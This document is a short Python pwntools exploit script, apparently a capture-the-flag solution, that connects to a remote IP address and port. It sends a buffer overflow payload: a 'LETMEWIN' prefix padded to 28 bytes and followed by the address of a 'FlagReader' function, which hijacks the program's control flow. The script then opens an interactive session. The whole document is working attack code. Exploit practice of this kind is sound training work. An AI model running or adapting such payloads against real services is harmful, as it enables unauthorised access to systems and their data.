from pwn import *

elf =context.binary =ELF('./main')


#p =process()
p =remote('20.19.88.15', 7400)
off=28

pay =b'LETMEWIN'
pay =pay.ljust(28,b'a')
adrwin=0x804a685+0x1337
pay =flat(
	pay
	,elf.sym['FlagReader']
	,elf.sym['FlagReader']
	,0+0x1337

	)
	
p.recv()

write('pay',pay)
p.sendline(pay)

p.sendline(b'LETMEWIN')


print(p.recv())
p.interactive()
